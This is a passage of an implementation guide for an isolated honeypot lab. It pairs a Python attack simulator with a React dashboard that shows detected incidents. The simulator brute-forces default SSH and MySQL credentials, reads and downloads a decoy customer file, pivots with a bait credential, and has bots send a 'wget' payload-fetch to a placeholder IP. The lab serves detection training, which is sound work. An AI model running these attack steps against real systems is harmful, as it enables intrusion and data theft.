# 06C — Implementation Guide, Part 3: Attack Simulator & Dashboard Frontend

> Covers Phases 4 and 6. **Authorised, isolated lab only.** The simulator lives on internal Docker networks and never touches anything outside the compose project.

## 1. Simulator (`sim/`)

### 1.1 `sim/Dockerfile`
```dockerfile
FROM python:3.11-slim
RUN apt-get update && apt-get install -y --no-install-recommends iproute2 && rm -rf /var/lib/apt/lists/*
RUN pip install --no-cache-dir paramiko pymysql
WORKDIR /sim
COPY *.py .
```

### 1.2 `sim/watcher.py` — one-way trigger (API writes file, sim reads it)
```python
import json, sys, time, os, importlib
mode = sys.argv[1]                       # targeted | noise
last = None
print(f"[sim:{mode}] waiting for triggers", flush=True)
while True:
    try:
        t = json.load(open("/sim_cmd/trigger.json"))
        if t["id"] != last and t["scenario"] == mode:
            last = t["id"]
            importlib.reload(importlib.import_module(mode)).run()
        elif t["id"] != last:
            last = t["id"]               # trigger was for the other sim
    except (FileNotFoundError, json.JSONDecodeError):
        pass
    time.sleep(1)
```

### 1.3 `sim/targeted.py` — the PS example, step by step
```python
import socket, time, random, paramiko, pymysql, urllib.request, urllib.parse

TRIPWIRE_PORTS = [2323, 4445, 3390, 5901, 6380, 9201]
def log(m): print(f"[attacker] {m}", flush=True)
def human(a=1.8, b=4.2): time.sleep(random.uniform(a, b))      # human-like typing delay

def scan():
    log("scanning decoy network")
    for p in TRIPWIRE_PORTS:
        try: socket.create_connection(("tripwire", p), 2).close()
        except Exception: pass
        time.sleep(0.3)

def mysql_default_creds():
    log("trying default MySQL creds on fileserv-01")
    for u, p in (("root", "root"), ("root", "")):
        try: pymysql.connect(host="opencanary", user=u, password=p, connect_timeout=3)
        except Exception: pass
        time.sleep(0.8)

def ssh_decoy():
    c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for u, p in (("root", "123456"), ("admin", "admin"), ("root", "root")):
        try:
            c.connect("cowrie", port=2222, username=u, password=p, timeout=5, allow_agent=False, look_for_keys=False)
            log(f"SSH login OK {u}:{p}"); break
        except Exception: time.sleep(1)
    else: return
    ch = c.invoke_shell(); time.sleep(1.5)
    for cmd in ["whoami", "uname -a", "ls /home/dbadmin", "cat /home/dbadmin/notes.txt",
                "ls /srv/backups", "cat /srv/backups/customer_data_2026.csv"]:
        human(); log(f"$ {cmd}"); ch.send(cmd + "\n")
        time.sleep(0.5)
        while ch.recv_ready(): ch.recv(65535)
    human(); ch.send("exit\n"); c.close()

def portal():
    log("web portal login + download")
    data = urllib.parse.urlencode({"u": "admin", "p": "admin"}).encode()
    try:
        urllib.request.urlopen(urllib.request.Request("http://portal:8080/login", data=data), timeout=5).read()
        time.sleep(1.5)
        urllib.request.urlopen("http://portal:8080/download/customer_data_2026.csv", timeout=5).read()
    except Exception as e: log(f"portal err {e}")

def prod_pivot():
    """Attacker reuses the bait credential found in notes.txt against a REAL host"""
    log("pivot: trying bait credential svc_backup against prod-web-01")
    try: socket.create_connection(("prod-sim", 80), 3).close()
    except Exception: pass
    c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try: c.connect("prod-sim", port=22, username="svc_backup", password="Bkp!2026#vault", timeout=5, allow_agent=False, look_for_keys=False)
    except Exception as e: log(f"prod auth result: {type(e).__name__}")

def wait_for_block():
    log("retrying prod every 4s (will fail once analyst blocks us)")
    for _ in range(40):
        time.sleep(4)
        try: socket.create_connection(("prod-sim", 22), 3).close(); log("still reachable")
        except Exception: log("CONNECTION DROPPED - we are blocked"); return

def run():
    scan(); time.sleep(2)
    mysql_default_creds(); time.sleep(2)
    ssh_decoy(); time.sleep(2)
    portal(); time.sleep(2)
    prod_pivot()
    wait_for_block()
```
> Paramiko's own `start_client` may try the host key algorithms Cowrie offers; if the connection is refused with algorithm errors, upgrade Cowrie/paramiko or relax `disabled_algorithms`.

### 1.4 `sim/noise.py` — internet background radiation from many IPs
```python
import random, socket, subprocess, threading, time, paramiko
CREDS = [("root","123456"),("root","password"),("admin","admin"),("ubuntu","ubuntu"),("root","root"),("test","test"),("pi","raspberry")]
BOT_CMDS = ["uname -a", "cat /proc/cpuinfo", "wget http://198.51.100.250/x.sh -O /tmp/x.sh"]
def ensure_aliases(n=20):
    for i in range(100, 100 + n):
        subprocess.run(["ip", "addr", "add", f"172.28.0.{i}/24", "dev", "eth0"], capture_output=True)

def one_bot(ip):
    try:
        cow = socket.gethostbyname("cowrie")
        s = socket.socket(); s.bind((ip, 0)); s.settimeout(5); s.connect((cow, 2222))
        t = paramiko.Transport(s); t.start_client(timeout=5)
        for u, p in random.sample(CREDS, random.randint(1, 3)):
            try: t.auth_password(u, p); break
            except paramiko.AuthenticationException: time.sleep(0.2)
        if t.is_authenticated() and random.random() < .5:
            ch = t.open_session(); ch.get_pty(); ch.invoke_shell()
            for c in BOT_CMDS: ch.send(c + "\n"); time.sleep(0.15)   # machine-speed cadence
        t.close()
    except Exception: pass

def run(waves=3, bots=15):
    ensure_aliases()
    for _ in range(waves):
        ips = [f"172.28.0.{random.randint(100, 119)}" for _ in range(bots)]
        ths = [threading.Thread(target=one_bot, args=(ip,)) for ip in ips]
        [t.start() for t in ths]; [t.join() for t in ths]
        time.sleep(2)
```

### 1.5 Seeding a fallback dataset (insurance)
`scripts/seed_demo.py` posts a captured JSON dump of events through the same `on_event` path (add a debug route `POST /api/_seed`) so the dashboard is populated even if Docker misbehaves on stage. Capture the dump at H12 and refresh at H20: `curl localhost:8000/api/events?limit=5000 > fixtures/golden_events.json`.

## 2. Frontend

### 2.1 Scaffold
```bash
cd frontend
npm create vite@latest . -- --template react-ts
npm i react-router-dom reactflow recharts framer-motion lucide-react xterm d3-geo topojson-client world-atlas @tanstack/react-query
npm i -D tailwindcss @tailwindcss/vite
```
`vite.config.ts`
```ts
import { defineConfig } from "vite"; import react from "@vitejs/plugin-react"; import tailwind from "@tailwindcss/vite";
export default defineConfig({ plugins: [react(), tailwind()],
  server: { proxy: { "/api": "http://localhost:8000", "/ws": { target: "ws://localhost:8000", ws: true } } } });
```
`src/index.css`
```css
@import "tailwindcss";
@theme {
  --color-bg: #0a0e17; --color-panel: #111827; --color-line: #1f2a3d;
  --color-crit: #ff3b5c; --color-high: #ff8a3d; --color-med: #f5c542; --color-low: #3dd6a8;
  --color-accent: #4da3ff; --color-ink: #e6edf7; --color-mute: #8a97ad;
}
body { background: var(--color-bg); color: var(--color-ink); font-family: Inter, system-ui, sans-serif; }
.mono { font-family: "JetBrains Mono", ui-monospace, monospace; }
@keyframes pulse-crit { 0%,100%{box-shadow:0 0 0 0 rgba(255,59,92,.6)} 50%{box-shadow:0 0 0 10px rgba(255,59,92,0)} }
.pulse-crit { animation: pulse-crit 1.6s infinite; }
```
`frontend/Dockerfile` (production image for compose)
```dockerfile
FROM node:20-alpine AS build
WORKDIR /app
COPY package*.json ./
RUN npm ci
COPY . .
RUN npm run build
FROM nginx:alpine
COPY --from=build /app/dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf
```
`frontend/nginx.conf`
```nginx
server {
  listen 80;
  location / { root /usr/share/nginx/html; try_files $uri /index.html; }
  location /api/ { proxy_pass http://api:8000; }
  location /ws/  { proxy_pass http://api:8000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection "upgrade"; }
}
```

### 2.2 Live data hook — `src/useLive.ts`
```ts
import { useEffect, useRef, useState } from "react";
export type Incident = any; export type Ev = any;
export function useLive() {
  const [events, setEvents] = useState<Ev[]>([]);
  const [incidents, setIncidents] = useState<Record<string, Incident>>({});
  const [connected, setConnected] = useState(false);
  const ws = useRef<WebSocket>();
  useEffect(() => {
    fetch("/api/incidents").then(r => r.json()).then(list => setIncidents(Object.fromEntries(list.map((i: any) => [i.id, i]))));
    const connect = () => {
      const w = new WebSocket(`${location.protocol === "https:" ? "wss" : "ws"}://${location.host}/ws/live`);
      w.onopen = () => setConnected(true);
      w.onclose = () => { setConnected(false); setTimeout(connect, 1500); };
      w.onmessage = m => {
        const { kind, data } = JSON.parse(m.data);
        if (kind === "event") setEvents(e => [data, ...e].slice(0, 200));
        if (kind === "incident") setIncidents(s => ({ ...s, [data.id]: { ...s[data.id], ...data } }));
      };
      ws.current = w;
    };
    connect(); return () => ws.current?.close();
  }, []);
  return { events, incidents, connected };
}
```
Dev fallback: if `/ws` fails, import `fixtures/golden_events.json` and replay with `setInterval`.

### 2.3 Kill-chain bar — `src/components/KillChainBar.tsx`
```tsx
const STAGES = [
  ["recon", "Recon"], ["initial_access", "Initial Access"], ["execution", "Execution"],
  ["discovery", "Discovery"], ["collection", "Collection"], ["exfiltration", "Exfiltration"], ["lateral_movement", "Lateral"],
];
const GROUP: Record<string, string> = { credential_attack: "initial_access", persistence: "execution", impact: "exfiltration" };
export default function KillChainBar({ stage }: { stage: string }) {
  const cur = STAGES.findIndex(([k]) => k === (GROUP[stage] ?? stage));
  return (
    <div className="flex gap-1">
      {STAGES.map(([k, label], i) => (
        <div key={k} className={`flex-1 rounded px-2 py-2 text-xs text-center border transition-all
          ${i <= cur ? (i === cur ? "bg-crit/20 border-crit text-crit font-semibold" : "bg-high/10 border-high/50 text-high") : "border-line text-mute"}`}>
          {label}
        </div>
      ))}
    </div>
  );
}
```

### 2.4 Incident page (the money screen) — `src/pages/IncidentPage.tsx`
```tsx
import { useParams } from "react-router-dom";
import { useEffect, useState } from "react";
import ReactFlow, { Background, Node, Edge } from "reactflow"; import "reactflow/dist/style.css";
import KillChainBar from "../components/KillChainBar";
import { useLive } from "../useLive";

const sevColor: any = { critical: "text-crit border-crit", high: "text-high border-high", medium: "text-med border-med", low: "text-low border-low" };

export default function IncidentPage() {
  const { id } = useParams(); const { incidents } = useLive();
  const [inc, setInc] = useState<any>(null);
  useEffect(() => { fetch(`/api/incidents/${id}`).then(r => r.json()).then(setInc); }, [id]);
  useEffect(() => { if (incidents[id!]?.timeline) setInc(incidents[id!]); }, [incidents]);
  if (!inc) return <div className="p-8 text-mute">Loading…</div>;

  // attack chain graph from timeline (collapse to one node per stage)
  const steps: any[] = []; const seen = new Set();
  for (const t of inc.timeline) { const k = t.stage ?? t.action; if (!seen.has(k)) { seen.add(k); steps.push(t); } }
  const nodes: Node[] = steps.map((s, i) => ({ id: String(i), position: { x: i * 210, y: s.zone === "production" ? 110 : 20 },
    data: { label: <div className="text-xs"><b>{(s.stage ?? s.action).replace("_", " ")}</b><br />{s.techniques.join(" ")}<br /><span className="text-mute">{s.summary.slice(0, 34)}</span></div> },
    style: { background: s.zone === "production" ? "#3a1020" : "#111827", border: `1px solid ${s.zone === "production" ? "#ff3b5c" : "#1f2a3d"}`, color: "#e6edf7", width: 190 } }));
  const edges: Edge[] = nodes.slice(1).map((n, i) => ({ id: `e${i}`, source: String(i), target: n.id, animated: true }));

  const act = (aid: string, mode: string) => fetch(`/api/incidents/${id}/actions/${aid}?mode=${mode}`, { method: "POST" }).then(r => r.json());

  return (
    <div className="p-6 grid gap-4">
      <header className="flex items-center gap-4">
        <div className={`mono text-2xl border rounded px-3 py-1 ${sevColor[inc.severity]} ${inc.severity === "critical" && inc.status !== "contained" ? "pulse-crit" : ""}`}>{inc.severity.toUpperCase()} · {inc.score}</div>
        <div><div className="mono text-lg">{inc.src_ip} <span className="text-mute">· {inc.country} · {inc.asn}</span></div>
          <div className="text-sm text-mute">{inc.verdict === "targeted" ? "🎯 TARGETED attacker" : "🌐 Opportunistic noise"} · status: <b className={inc.status === "contained" ? "text-low" : "text-crit"}>{inc.status}</b></div></div>
      </header>
      <KillChainBar stage={inc.stage} />
      <p className="text-sm bg-panel border border-line rounded p-3">{inc.narrative}</p>
      <div className="h-56 bg-panel border border-line rounded"><ReactFlow nodes={nodes} edges={edges} fitView proOptions={{ hideAttribution: true }}><Background color="#1f2a3d" /></ReactFlow></div>
      <div className="grid grid-cols-3 gap-4">
        <section className="bg-panel border border-line rounded p-3"><h3 className="text-xs text-mute mb-2">WHY THIS SCORE</h3>
          {inc.factors.map((f: any, i: number) => <div key={i} className="flex justify-between text-sm"><span>{f.label}</span><span className={f.points < 0 ? "text-low" : "text-high"}>{f.points > 0 ? "+" : ""}{f.points}</span></div>)}</section>
        <section className="bg-panel border border-line rounded p-3"><h3 className="text-xs text-mute mb-2">ATT&CK TECHNIQUES</h3>
          <div className="flex flex-wrap gap-1">{inc.techniques.map((t: any) => <a key={t.id} target="_blank" href={`https://attack.mitre.org/techniques/${t.id.replace(".", "/")}/`} className="mono text-xs border border-accent/50 text-accent rounded px-2 py-1" title={t.tactic}>{t.id} {t.name}</a>)}</div></section>
        <section className={`border rounded p-3 ${inc.real_asset_touched ? "bg-crit/10 border-crit" : "bg-panel border-line"}`}><h3 className="text-xs text-mute mb-2">REAL-ASSET CHECK</h3>
          {inc.real_asset_touched ? inc.real_asset_events.slice(0, 5).map((e: any, i: number) => <div key={i} className="mono text-xs">{e.ts.slice(11, 19)} {e.sensor} {e.summary ?? `${e.action}:${e.outcome}`}</div>) : <div className="text-sm text-low">No contact with production</div>}</section>
      </div>
      <div className="grid grid-cols-2 gap-4">
        <section className="bg-black border border-line rounded p-3 mono text-xs h-56 overflow-auto"><h3 className="text-mute mb-2">SESSION TRANSCRIPT</h3>
          {inc.transcript.map((c: any, i: number) => <div key={i}><span className="text-mute">{c.ts.slice(11, 19)}</span> <span className="text-low">$</span> {c.cmd}</div>)}</section>
        <section className="bg-panel border border-line rounded p-3"><h3 className="text-xs text-mute mb-2">RECOMMENDED RESPONSE</h3>
          {inc.actions.map((a: any) => <div key={a.id} className="flex items-center justify-between py-2 border-b border-line">
            <div><div className="text-sm">{a.title}</div><div className="text-xs text-mute">{a.result ?? a.why}</div></div>
            {a.status === "executed" ? <span className="text-low text-xs">executed ✓</span> : <div className="flex gap-1">
              {["block_source", "isolate_host", "rotate_credentials"].includes(a.type) && <button onClick={() => act(a.id, "dry_run")} className="text-xs border border-line rounded px-2 py-1">Dry-run</button>}
              {a.type === "export_iocs" ? <a className="text-xs bg-accent text-black rounded px-2 py-1" href={`/api/incidents/${id}/export/stix`}>STIX</a> : <button onClick={() => act(a.id, "approve")} className="text-xs bg-crit text-white rounded px-2 py-1">Approve</button>}</div>}
          </div>)}</section>
      </div>
    </div>
  );
}
```
Note `inc.real_asset_events` items are raw normalized events (`action`, `outcome`, `sensor`), so the `summary ?? …` fallback is intentional.

### 2.5 Other screens (build order)
1. **CommandCenter** (`/`): KPI cards from `/api/stats` (refetch on incident events), live feed list (`events`), alert queue (`incidents` sorted), severity donut (Recharts `PieChart`), threat map (d3-geo with country dots using `inc.country` → centroid lookup table; fallback: bar list).
2. **Attackers** (`/attackers`): table of incidents with profile columns (cadence, creds tried, client, sensors).
3. **ATT&CK** (`/attack`): fetch `/api/attack-matrix`, group by `tactic`, render columns of technique cards with color by `count`.
4. **Demo Control** (drawer in the app shell): buttons `POST /api/demo/noise`, `POST /api/demo/targeted`, `POST /api/demo/reset`.
5. **Session Replay** (P2): xterm.js, write each transcript line with `setTimeout` gaps = original timestamps (scaled 0.5×).

### 2.6 `App.tsx` routing sketch
```tsx
<BrowserRouter><Shell>
  <Routes>
    <Route path="/" element={<CommandCenter />} />
    <Route path="/incident/:id" element={<IncidentPage />} />
    <Route path="/attackers" element={<Attackers />} />
    <Route path="/attack" element={<AttackMatrix />} />
  </Routes></Shell></BrowserRouter>
```
Because incident ids contain dots (`INC-203.0.113.50`), URL-encode them with `encodeURIComponent` in links.

## 3. Run everything
```bash
docker compose up -d --build
docker compose ps                      # all Up
open http://localhost:5173
# Demo Control → Launch Noise Storm → then Launch Targeted Attack
```
Logs for debugging: `docker compose logs -f api attacker-sim cowrie`.

## 4. Phase 4/6 exit checklist
- [ ] Noise Storm creates many low/medium **opportunistic** incidents
- [ ] Targeted Attack creates one incident that escalates low → critical live
- [ ] Incident page shows kill-chain, techniques, why-score, transcript, real-asset panel, actions
- [ ] Approve block → sim prints "CONNECTION DROPPED" → status flips to **contained**
- [ ] Reset returns to a clean dashboard
